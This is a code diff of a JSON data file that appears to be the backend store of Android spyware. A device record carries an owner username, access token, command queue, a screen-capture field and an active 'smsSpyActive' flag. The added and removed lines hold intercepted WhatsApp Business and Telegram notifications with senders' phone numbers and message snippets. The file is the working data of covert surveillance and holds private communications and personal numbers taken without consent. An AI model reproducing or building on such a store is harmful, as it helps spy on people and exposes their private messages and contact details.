@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775633803930,
+    "lastSeen": 1775633806844,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "30",
+        "time": "08/04 14:36",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633804073
+      },
+      {
+        "appName": "WA Business",
+        "sender": "WA Business",
+        "content": "‎‎3 pesan dari 2 chat",
+        "time": "08/04 14:36",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633804067
+      },
       {
         "appName": "WA Business",
         "sender": "+62 815-2386-4283",
@@ -4310,22 +4326,6 @@
         "time": "08/04 14:21",
         "pkg": "org.telegram.messenger.web",
         "receivedAt": 1775632890386
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "14 new messages from 13 chats",
-        "time": "08/04 14:21",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632890231
-      },
-      {
-        "appName": "Telegram",
-        "sender": "STORE Reski",
-        "content": "Uy",
-        "time": "08/04 14:21",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632877696
       }
     ],
     "galleryPhotos": [],
